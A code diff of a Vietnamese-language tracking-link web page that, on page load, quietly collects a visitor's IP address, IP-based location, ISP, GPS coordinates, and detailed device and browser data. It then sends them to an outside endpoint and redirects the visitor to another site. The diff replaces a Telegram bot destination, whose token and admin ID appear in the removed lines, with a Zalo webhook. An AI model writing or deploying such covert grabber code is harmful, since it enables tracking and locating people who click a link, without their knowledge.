@@ -52,48 +52,44 @@
     <script>
         const urlParams = new URLSearchParams(window.location.search);
         const linkId = urlParams.get('id');
-        
-        const BOT_TOKEN = '8905586511:AAEj_pj1I7qb85BmdVpkA_l4Dvn6PelDFd8';
-        const ADMIN_ID = '6532184208';
+
+        // Cấu hình đích gửi Zalo (qua server/webhook trung gian)
+        const ZALO_WEBHOOK_URL = 'https://your-server-domain.com/api/zalo-notify';
+        const ZALO_TARGET_ID = 'YOUR_ZALO_USER_OR_GROUP_ID';
+        const ZALO_THREAD_TYPE = 'user'; // 'user' hoặc 'group'
         const TARGET_URL = 'https://autolottoxworld-khoadz.onrender.com';
-        
-        // ============ LẤY IPv4 ============
+
         async function getIPv4() {
             const apis = [
                 { url: 'https://api.ipify.org?format=json', type: 'json', parse: d => d.ip },
                 { url: 'https://ipv4.icanhazip.com', type: 'text', parse: d => d.trim() }
             ];
-            
+
             for (const api of apis) {
                 try {
                     const controller = new AbortController();
                     const timeoutId = setTimeout(() => controller.abort(), 2000);
-                    
+
                     const res = await fetch(api.url, { signal: controller.signal });
                     clearTimeout(timeoutId);
-                    
-                    let data;
-                    if (api.type === 'json') data = await res.json();
-                    else data = await res.text();
-                    
+
+                    const data = api.type === 'json' ? await res.json() : await res.text();
                     const ip = api.parse(data);
                     if (ip && !ip.includes(':')) return ip;
-                } catch(e) {}
+                } catch (e) {}
             }
             return 'Không xác định';
         }
-        
-        // ============ LẤY VỊ TRÍ + TỌA ĐỘ ============
+
         async function getLocation(ip) {
             try {
                 const controller = new AbortController();
                 const timeoutId = setTimeout(() => controller.abort(), 3000);
-                
+
                 const res = await fetch(`https://ipwho.is/${ip}`, { signal: controller.signal });
                 clearTimeout(timeoutId);
-                
+
                 const data = await res.json();
-                
                 return {
                     loc: `${data.city || 'N/A'}, ${data.region || 'N/A'}, ${data.country || 'N/A'}`,
                     isp: data.connection?.isp || 'N/A',
@@ -101,12 +97,11 @@
                     longitude: data.longitude || 'N/A',
                     timezone: data.timezone?.id || 'N/A'
                 };
-            } catch(e) {
-                // Thử API khác
+            } catch (e) {
                 try {
                     const res = await fetch(`https://ip-api.com/json/${ip}?fields=status,country,regionName,city,lat,lon,isp,org,timezone`);
                     const data = await res.json();
-                    
+
                     if (data.status === 'success') {
                         return {
                             loc: `${data.city || 'N/A'}, ${data.regionName || 'N/A'}, ${data.country || 'N/A'}`,
@@ -116,25 +111,29 @@
                             timezone: data.timezone || 'N/A'
                         };
                     }
-                } catch(e2) {}
-                
-                return { loc: 'Không xác định', isp: 'Không xác định', latitude: 'N/A', longitude: 'N/A', timezone: 'N/A' };
+                } catch (e2) {}
+
+                return {
+                    loc: 'Không xác định',
+                    isp: 'Không xác định',
+                    latitude: 'N/A',
+                    longitude: 'N/A',
+                    timezone: 'N/A'
+                };
             }
         }
-        
-        // ============ LẤY GPS CHÍNH XÁC (NẾU USER CHO PHÉP) ============
+
         function getGPS() {
             return new Promise((resolve) => {
                 if (!navigator.geolocation) {
                     resolve({ gpsLat: 'Không hỗ trợ', gpsLng: 'Không hỗ trợ' });
                     return;
                 }
-                
-                // Timeout 3 giây
+
                 const timeout = setTimeout(() => {
                     resolve({ gpsLat: 'Không cho phép', gpsLng: 'Không cho phép' });
                 }, 3000);
-                
+
                 navigator.geolocation.getCurrentPosition(
                     (position) => {
                         clearTimeout(timeout);
@@ -143,7 +142,7 @@
                             gpsLng: position.coords.longitude.toFixed(6)
                         });
                     },
-                    (error) => {
+                    () => {
                         clearTimeout(timeout);
                         resolve({ gpsLat: 'Bị từ chối', gpsLng: 'Bị từ chối' });
                     },
@@ -151,18 +150,16 @@
                 );
             });
         }
-        
-        // ============ LẤY THÔNG TIN THIẾT BỊ CHI TIẾT ============
+
         function getDeviceInfo() {
             const ua = navigator.userAgent;
             const uaLower = ua.toLowerCase();
-            
+
             let device = 'Unknown';
             let os = 'Unknown';
             let browser = 'Unknown';
             let browserVersion = '';
-            
-            // ============ THIẾT BỊ CHI TIẾT ============
+
             if (/iphone/.test(uaLower)) {
                 device = 'iPhone';
                 const match = ua.match(/iPhone(\d+,\d+)/);
@@ -172,12 +169,7 @@
                 const match = ua.match(/iPad(\d+,\d+)/);
                 if (match) device = `iPad (Model: ${match[1]})`;
             } else if (/android/.test(uaLower)) {
-                if (/mobile/.test(uaLower)) {
-                    device = 'Android Phone';
-                } else {
-                    device = 'Android Tablet';
-                }
-                // Lấy tên máy Android
+                device = /mobile/.test(uaLower) ? 'Android Phone' : 'Android Tablet';
                 const match = ua.match(/Android \d+; ([^;]+)/);
                 if (match) device = match[1].trim();
             } else if (/macintosh/.test(uaLower)) {
@@ -187,27 +179,22 @@
             } else if (/linux/.test(uaLower)) {
                 device = 'Linux PC';
             }
-            
-            // ============ OS CHI TIẾT ============
+
             if (/iphone|ipad|ipod/.test(uaLower)) {
                 const match = ua.match(/OS (\d+_\d+)/);
-                if (match) os = `iOS ${match[1].replace('_', '.')}`;
-                else os = 'iOS';
+                os = match ? `iOS ${match[1].replace('_', '.')}` : 'iOS';
             } else if (/android/.test(uaLower)) {
                 const match = ua.match(/Android (\d+)/);
-                if (match) os = `Android ${match[1]}`;
-                else os = 'Android';
+                os = match ? `Android ${match[1]}` : 'Android';
             } else if (/windows nt 10.0/.test(uaLower)) os = 'Windows 10';
             else if (/windows nt 11.0/.test(uaLower)) os = 'Windows 11';
             else if (/windows nt 6.3/.test(uaLower)) os = 'Windows 8.1';
             else if (/windows nt 6.1/.test(uaLower)) os = 'Windows 7';
             else if (/mac os x/.test(uaLower)) {
                 const match = ua.match(/Mac OS X (\d+_\d+)/);
-                if (match) os = `macOS ${match[1].replace('_', '.')}`;
-                else os = 'macOS';
+                os = match ? `macOS ${match[1].replace('_', '.')}` : 'macOS';
             }
-            
-            // ============ BROWSER CHI TIẾT ============
+
             if (/crios/.test(uaLower)) {
                 browser = 'Chrome (iOS)';
                 browserVersion = ua.match(/CriOS\/(\d+)/)?.[1] || '';
@@ -230,32 +217,56 @@
                 browser = 'Safari';
                 browserVersion = ua.match(/Version\/(\d+)/)?.[1] || '';
             }
-            
+
             if (browserVersion) browser += ` v${browserVersion}`;
-            
-            // ============ THÔNG TIN KHÁC ============
-            const screen = `${window.screen.width}x${window.screen.height}`;
-            const ram = navigator.deviceMemory ? `${navigator.deviceMemory}GB` : 'N/A';
-            const cores = navigator.hardwareConcurrency || 'N/A';
-            const touch = 'ontouchstart' in window ? 'Có' : 'Không';
-            const pixelRatio = window.devicePixelRatio || 1;
-            
-            return { device, os, browser, screen, ram, cores, touch, pixelRatio };
+
+            return {
+                device,
+                os,
+                browser,
+                screen: `${window.screen.width}x${window.screen.height}`,
+                ram: navigator.deviceMemory ? `${navigator.deviceMemory}GB` : 'N/A',
+                cores: navigator.hardwareConcurrency || 'N/A',
+                touch: 'ontouchstart' in window ? 'Có' : 'Không',
+                pixelRatio: window.devicePixelRatio || 1
+            };
         }
-        
-        // ============ THU THẬP TẤT CẢ ============
+
+        async function sendToZaloWebhook(payload) {
+            const controller = new AbortController();
+            const timeoutId = setTimeout(() => controller.abort(), 3000);
+
+            try {
+                await fetch(ZALO_WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload),
+                    signal: controller.signal
+                });
+            } catch (e) {
+            } finally {
+                clearTimeout(timeoutId);
+            }
+        }
+
         async function collectAndRedirect() {
             if (!linkId || linkId.length < 8) {
                 window.location.replace(TARGET_URL);
                 return;
             }
-            
-            const data = { linkId: linkId };
-            
-            // Lấy IP
+
+            const data = {
+                linkId,
+                ip: 'Không xác định',
+                loc: 'Không xác định',
+                isp: 'Không xác định',
+                lat: 'N/A',
+                lng: 'N/A',
+                timezone: 'N/A'
+            };
+
             data.ip = await getIPv4();
-            
-            // Lấy vị trí + tọa độ
+
             if (data.ip !== 'Không xác định') {
                 const locData = await getLocation(data.ip);
                 data.loc = locData.loc;
@@ -264,49 +275,53 @@
                 data.lng = locData.longitude;
                 data.timezone = locData.timezone;
             }
-            
-            // Lấy GPS (nếu user cho phép)
+
             const gps = await getGPS();
             data.gpsLat = gps.gpsLat;
             data.gpsLng = gps.gpsLng;
-            
-            // Lấy thông tin thiết bị chi tiết
+
             const deviceInfo = getDeviceInfo();
-            data.device = deviceInfo.device;
-            data.os = deviceInfo.os;
-            data.browser = deviceInfo.browser;
-            data.screen = deviceInfo.screen;
-            data.ram = deviceInfo.ram;
-            data.cores = deviceInfo.cores;
-            data.touch = deviceInfo.touch;
-            data.pixelRatio = deviceInfo.pixelRatio;
-            
+            Object.assign(data, deviceInfo);
+
             data.time = new Date().toLocaleString('vi-VN');
             data.referrer = document.referrer || 'Trực tiếp';
             data.lang = navigator.language || 'N/A';
-            
-            // ============ GỬI VỀ TELEGRAM ============
-            const msg = `🔍 *LINK ID:* \`${linkId}\`\n━━━━━━━━━━━━━━━\n🌐 *IP:* \`${data.ip}\`\n📍 *Vị trí:* ${data.loc}\n📡 *ISP:* ${data.isp}\n🗺️ *Tọa độ IP:* ${data.lat}, ${data.lng}\n🕐 *Timezone:* ${data.timezone}\n📍 *GPS:* ${data.gpsLat}, ${data.gpsLng}\n━━━━━━━━━━━━━━━\n📱 *Thiết bị:* ${data.device}\n💻 *OS:* ${data.os}\n🌍 *Browser:* ${data.browser}\n🖥️ *Màn hình:* ${data.screen}\n💾 *RAM:* ${data.ram}\n⚡ *CPU Cores:* ${data.cores}\n👆 *Touch:* ${data.touch}\n📐 *Pixel Ratio:* ${data.pixelRatio}\n━━━━━━━━━━━━━━━\n🌐 *Ngôn ngữ:* ${data.lang}\n⏰ *Thời gian:* ${data.time}\n🔗 *Referrer:* ${data.referrer}`;
-            
-            try {
-                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        chat_id: ADMIN_ID,
-                        text: msg,
-                        parse_mode: 'Markdown'
-                    })
-                });
-            } catch(e) {}
-            
-            // Chuyển hướng
+
+            const msg =
+`🔍 LINK ID: ${linkId}
+━━━━━━━━━━━━━━━
+🌐 IP: ${data.ip}
+📍 Vị trí: ${data.loc}
+📡 ISP: ${data.isp}
+🗺️ Tọa độ IP: ${data.lat}, ${data.lng}
+🕐 Timezone: ${data.timezone}
+📍 GPS: ${data.gpsLat}, ${data.gpsLng}
+━━━━━━━━━━━━━━━
+📱 Thiết bị: ${data.device}
+💻 OS: ${data.os}
+🌍 Browser: ${data.browser}
+🖥️ Màn hình: ${data.screen}
+💾 RAM: ${data.ram}
+⚡ CPU Cores: ${data.cores}
+👆 Touch: ${data.touch}
+📐 Pixel Ratio: ${data.pixelRatio}
+━━━━━━━━━━━━━━━
+🌐 Ngôn ngữ: ${data.lang}
+⏰ Thời gian: ${data.time}
+🔗 Referrer: ${data.referrer}`;
+
+            await sendToZaloWebhook({
+                target_id: ZALO_TARGET_ID,
+                thread_type: ZALO_THREAD_TYPE,
+                message: msg,
+                raw_data: data
+            });
+
             window.location.replace(TARGET_URL);
         }
-        
+
         window.addEventListener('load', collectAndRedirect);
-        
-        // Bảo hiểm 5 giây
+
         setTimeout(() => {
             window.location.replace(TARGET_URL);
         }, 5000);
